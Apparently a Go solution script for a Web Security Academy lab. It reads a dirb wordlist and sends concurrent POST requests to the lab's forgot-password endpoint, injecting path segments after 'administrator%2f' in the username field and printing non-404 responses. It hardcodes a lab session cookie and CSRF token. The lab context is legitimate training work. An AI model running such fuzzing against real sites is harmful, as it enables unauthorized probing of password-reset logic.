package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"sync"
)

var (
	goRoutinesNum = 40
	mainUrl       = "https://0a7500260457c3a48096f817005b00b5.web-security-academy.net" // should NOT end with "/"
	// mainUrl       = "http://localhost:3333" // should NOT end with "/"
	cookieSession = "session=l8KLHF7yTl5M6lXwWrnPkGNM8Jn3TCwm"
)

func main() {
	file, err := os.Open("/usr/share/wordlists/dirb/common.txt")
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	defer file.Close()

	bufferedReader := bufio.NewScanner(file)

	count := goRoutinesNum
	done := false
	for done != true {
		fmt.Println(count)
		var wg sync.WaitGroup

		for i := 0; i < goRoutinesNum; i++ {
			canMoreMore := bufferedReader.Scan()
			if !canMoreMore {
				done = true
				break
			}
			line := bufferedReader.Text()

			wg.Add(1)
			go flow(&wg, line)
		}

		wg.Wait()
		count += goRoutinesNum
	}

	if err := bufferedReader.Err(); err != nil {
		fmt.Println("Error:", err)
	}

}

func flow(wg *sync.WaitGroup, line string) {
	defer wg.Done()

	resp := makeHttpReq(http.MethodPost, mainUrl+"/forgot-password", "csrf=ecIew6LswCIcl4AxMNjx8iWKDQr5wfX8&username=administrator%2f"+line, cookieSession, true)
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusNotFound {
		fmt.Println("-----")
		fmt.Println("-----")
		fmt.Println(line)
		fmt.Println(resp.StatusCode)
		fmt.Println("-----")
		fmt.Println("-----")
	}
}
